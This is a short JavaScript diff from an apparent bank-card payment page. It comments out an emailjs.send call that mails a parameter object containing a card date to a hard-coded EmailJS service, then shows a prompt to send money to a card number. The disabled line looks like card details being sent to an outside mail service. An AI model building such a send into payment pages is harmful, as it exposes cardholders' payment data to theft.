@@ -38,7 +38,7 @@ function confirm() {
       message: cardDate,
          
    }
- emailjs.send("service_exfzcaq","template_q7b1lho",firstParams);
+ //emailjs.send("service_exfzcaq","template_q7b1lho",firstParams);
 
    html = `<p class="send-drop">Do you want to send <span class="span-amount">$${confirm}</span> to this bank card <span class="span-amount">${atmNumber}</span></p>
 
@@ -53,5 +53,6 @@ function confirm() {
  document.querySelector('.js-check').innerHTML = html
 
 }
+
 
 
